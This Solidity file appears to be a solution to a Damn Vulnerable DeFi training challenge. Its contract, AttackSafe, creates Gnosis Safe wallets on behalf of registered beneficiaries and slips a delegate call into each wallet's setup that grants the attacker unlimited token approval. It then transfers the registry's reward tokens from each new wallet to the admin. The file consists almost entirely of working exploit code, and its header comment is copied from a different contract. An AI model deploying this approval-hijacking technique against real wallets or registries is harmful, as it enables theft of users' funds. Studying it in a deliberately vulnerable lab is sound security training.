// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./WalletRegistry.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
           When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackSafe {
    address admin;
    address walletRegistry;
    address masterCopy;
    address walletFactory;
    address token;

    constructor(address _walletRegistry, address _masterCopy, address _walletFactory, address _token) {
        admin = msg.sender;
        walletRegistry = _walletRegistry;
        masterCopy = _masterCopy;
        walletFactory = _walletFactory;
        token = _token;
    }

    function attack(address[] memory beneficiaries) external onlyAdmin {
        // loop through benificaries
        uint256 i;
        for (i=0;i<beneficiaries.length;i++) {
            // create gnosis safe with benificiary as first owner
            // create proxy from factory using createProxyWithCallback
            // in initializer setup call, make delegate call to this contract to make token approval
            // 
            // initializer should be setup call with the following params:
            //        address[] calldata _owners,
            //        uint256 _threshold,
            //        address to,
            //        bytes calldata data,
            //        address fallbackHandler,
            //        address paymentToken,
            //        uint256 payment,
            //        address payable paymentReceiver

            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];
            bytes memory data = abi.encodeWithSignature(
                "givePermission(address,address)",
                token,
                address(this)
            );

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                data,
                address(0),
                address(0),
                0,
                payable(address(0))
            );

            GnosisSafeProxy wallet = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
                masterCopy, 
                initializer,
                0,
                IProxyCreationCallback(walletRegistry)
            );

            IERC20(token).transferFrom(address(wallet), address(admin), 10 ether);
        }
    }

    function givePermission(address _token, address target) external {
        IERC20(_token).approve(target, type(uint256).max);
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "must be admin to call this function");
        _;
    }
}
